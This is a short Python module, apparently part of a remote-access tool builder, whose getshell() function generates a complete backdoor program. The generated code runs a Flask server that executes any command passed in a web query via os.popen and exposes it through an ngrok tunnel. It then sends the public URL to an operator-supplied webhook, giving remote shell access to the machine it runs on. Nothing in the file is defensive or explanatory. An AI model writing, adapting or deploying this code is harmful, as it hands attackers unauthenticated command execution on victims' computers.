def getvs():
       return "1.0"
def getshell(webhook,at):
       return f"""from flask import Flask, request, jsonify
import os
from pyngrok import ngrok
import requests

# Ngrok Auth Token
AUTH_TOKEN = '{at}'

# Webhook URL
webhook = '{webhook}'
"""+"""
# Flask app başlat
app = Flask(__name__)

@app.route("/", methods=["GET"])
def rce():
    cmd = request.args.get("cmd")
    if cmd:
        if cmd.startswith("cd "):
            try:
                os.chdir(cmd.split(" ", 1)[1].strip())
                return jsonify({"result": "ok"})
            except Exception as e:
                return jsonify({"error": str(e)})
        else:
            try:
                result = os.popen(cmd.strip()).read()
                return jsonify({"result": result})
            except Exception as e:
                return jsonify({"error": str(e)})
    return jsonify({"result": "no command"})

if __name__ == "__main__":
    # Token'ı ngrok'a yaz
    ngrok.set_auth_token(AUTH_TOKEN)

    # Flask için tünel aç (port 65534)
    public_url = ngrok.connect(65534)
    print("Ngrok URL:", public_url)

    # Webhook'a URL gönder
    try:
        requests.post(url=webhook, json={"ngrok": str(public_url)})
    except Exception as e:
        print("Webhook gönderimi başarısız:", str(e))

    # Flask app başlat
    app.run(port=65534)
"""


